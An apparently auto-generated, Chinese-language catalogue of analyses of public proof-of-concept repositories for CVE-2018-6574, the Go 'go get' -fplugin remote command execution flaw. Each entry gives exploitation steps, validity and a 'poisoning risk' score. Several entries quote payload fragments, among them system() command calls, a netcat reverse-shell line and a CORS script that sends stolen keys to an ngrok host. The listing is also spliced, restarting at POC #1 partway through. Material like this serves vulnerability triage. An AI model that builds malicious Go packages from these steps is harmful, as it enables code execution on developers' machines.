*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

